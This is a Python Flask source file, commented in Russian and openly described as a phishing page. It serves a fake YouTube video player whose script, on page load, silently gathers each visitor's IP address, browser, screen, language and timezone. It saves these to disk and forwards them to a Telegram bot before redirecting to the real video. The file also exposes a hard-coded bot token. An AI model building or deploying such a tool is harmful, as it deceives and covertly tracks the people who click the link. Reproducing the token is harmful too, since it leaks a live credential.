from flask import Flask, request, render_template_string, jsonify, redirect
from flask_cors import CORS
import json
import time
from datetime import datetime
import hashlib
import requests
import re
import os

app = Flask(__name__)
CORS(app)  # Разрешить кросс-доменные запросы

# Конфигурация
BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"  # Замените на реальный
ADMIN_ID = 1709490182
SECRET_KEY = "my-super-secret-key-12345"  # Должен совпадать с bot.py
DOMAIN = "http://localhost:5000"  # Локально, потом замените на Render домен

# HTML шаблон фишинговой страницы (упрощенная версия)
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #0f0f0f;
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 800px;
            background: #1a1a1a;
            border-radius: 10px;
            padding: 30px;
            text-align: center;
            border: 1px solid #333;
        }
        .logo {
            font-size: 50px;
            color: #ff0000;
            margin-bottom: 20px;
        }
        h1 {
            margin-bottom: 10px;
            color: #fff;
        }
        .subtitle {
            color: #aaa;
            margin-bottom: 30px;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            margin: 20px 0;
            color: #4CAF50;
        }
        .video-container {
            margin: 30px 0;
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
        }
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            border-radius: 8px;
        }
        .warning {
            color: #ff9800;
            font-size: 12px;
            margin-top: 20px;
            padding: 10px;
            background: rgba(255,152,0,0.1);
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">▶️</div>
        <h1>Загрузка видео...</h1>
        <div class="subtitle">Пожалуйста, подождите. Видео скоро начнется.</div>
        
        <div class="loader"></div>
        
        <div class="status" id="status">Подготовка плеера...</div>
        
        <div class="video-container">
            <iframe 
                src="https://www.youtube.com/embed/{{ video_id }}?autoplay=1"
                allow="autoplay; encrypted-media"
                allowfullscreen>
            </iframe>
        </div>
        
        <div class="warning">
            Для корректного воспроизведения убедитесь, что у вас включен JavaScript.
        </div>
    </div>

    <script>
        // Сбор данных
        const collectedData = {
            timestamp: new Date().toISOString(),
            link_id: "{{ link_id }}",
            video_id: "{{ video_id }}",
            user_agent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: document.cookie ? 'Есть' : 'Нет',
            online: navigator.onLine
        };
        
        // Получаем IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                collectedData.ip = data.ip;
            } catch {
                collectedData.ip = 'не определен';
            }
        }
        
        // Основная функция
        async function startCollection() {
            document.getElementById('status').textContent = 'Сбор информации...';
            
            // Получаем IP
            await getIP();
            
            // Ждем 2 секунды для имитации загрузки
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Отправляем данные
            try {
                document.getElementById('status').textContent = 'Отправка данных...';
                
                const response = await fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(collectedData)
                });
                
                if (response.ok) {
                    document.getElementById('status').textContent = '✅ Данные отправлены!';
                    // Через 3 секунды редирект
                    setTimeout(() => {
                        window.location.href = 'https://www.youtube.com/watch?v={{ video_id }}';
                    }, 3000);
                }
            } catch (error) {
                console.error('Ошибка:', error);
                document.getElementById('status').textContent = '⚠️ Ошибка отправки';
                setTimeout(() => {
                    window.location.href = 'https://www.youtube.com/watch?v={{ video_id }}';
                }, 3000);
            }
        }
        
        // Запускаем через 1 секунду
        setTimeout(startCollection, 1000);
    </script>
</body>
</html>
'''

# ========== FLASK МАРШРУТЫ ==========

@app.route('/')
def index():
    return redirect('https://www.youtube.com')

@app.route('/watch')
def watch():
    """Фишинговая страница"""
    video_id = request.args.get('v', 'dQw4w9WgXcQ')
    link_id = request.args.get('id', 'unknown')
    
    # Логируем посещение
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    print(f"\n{'='*50}")
    print(f"[+] Новый посетитель")
    print(f"[+] Время: {datetime.now().strftime('%H:%M:%S')}")
    print(f"[+] IP: {ip}")
    print(f"[+] Video ID: {video_id}")
    print(f"[+] Link ID: {link_id}")
    print(f"{'='*50}")
    
    # Сохраняем лог
    try:
        with open('visits.log', 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().isoformat()},{ip},{link_id},{video_id}\n")
    except:
        pass
    
    # Рендерим страницу
    rendered_html = HTML_TEMPLATE.replace('{{ video_id }}', video_id)\
                                 .replace('{{ link_id }}', link_id)
    return render_template_string(rendered_html)

@app.route('/collect', methods=['POST'])
def collect_data():
    """Прием данных от фишинговой страницы"""
    try:
        data = request.json
        
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
        
        # Извлекаем данные
        link_id = data.get('link_id', 'unknown')
        ip = data.get('ip', 'unknown')
        video_id = data.get('video_id', 'unknown')
        
        print(f"\n{'='*50}")
        print(f"[!] Данные получены")
        print(f"[!] Link ID: {link_id}")
        print(f"[!] IP: {ip}")
        print(f"[!] Video: {video_id}")
        print(f"[!] User Agent: {data.get('user_agent', '')[:50]}...")
        print(f"{'='*50}")
        
        # Сохраняем в файл
        try:
            filename = f"data_{link_id}_{int(time.time())}.json"
            os.makedirs('collected_data', exist_ok=True)
            with open(f'collected_data/{filename}', 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            print(f"[+] Данные сохранены: {filename}")
        except Exception as e:
            print(f"[-] Ошибка сохранения: {e}")
        
        # Отправляем в Telegram бот
        send_to_telegram_bot(data)
        
        return jsonify({
            'status': 'success',
            'message': 'Data received',
            'redirect': f'https://youtube.com/watch?v={video_id}'
        })
        
    except Exception as e:
        print(f"[-] Ошибка обработки: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def send_to_telegram_bot(data):
    """Отправка данных в Telegram бот"""
    try:
        # URL вашего бота (локально)
        webhook_url = "http://localhost:8080/webhook"
        
        # Если бот на Render:
        # webhook_url = "https://ваш-бот.onrender.com/webhook"
        
        response = requests.post(
            webhook_url,
            json=data,
            headers={'X-Auth-Key': SECRET_KEY},
            timeout=5
        )
        
        if response.status_code == 200:
            print(f"[→] Данные отправлены боту")
        else:
            print(f"[-] Бот не ответил: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print("[-] Бот не запущен или недоступен")
    except Exception as e:
        print(f"[-] Ошибка отправки боту: {e}")

@app.route('/stats')
def stats():
    """Статистика"""
    try:
        visits_count = 0
        if os.path.exists('visits.log'):
            with open('visits.log', 'r') as f:
                visits_count = len(f.readlines())
        
        data_count = 0
        if os.path.exists('collected_data'):
            data_count = len([f for f in os.listdir('collected_data') if f.endswith('.json')])
        
        return jsonify({
            'status': 'ok',
            'visits': visits_count,
            'data_files': data_count,
            'time': datetime.now().isoformat()
        })
    except:
        return jsonify({'status': 'error'})

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'service': 'YouTube Server'})

# ========== ЗАПУСК СЕРВЕРА ==========

if __name__ == '__main__':
    # Создаем папки
    os.makedirs('collected_data', exist_ok=True)
    
    print(f"""
    {'='*50}
    🚀 YouTube Server запущен!
    📍 http://localhost:5000
    ⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    
    🔗 Пример ссылки:
    http://localhost:5000/watch?v=dQw4w9WgXcQ&id=test123
    
    📊 Статистика: http://localhost:5000/stats
    ❤️  Здоровье: http://localhost:5000/health
    {'='*50}
    """)
    
    # Запускаем сервер
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=True,
        threaded=True
    )
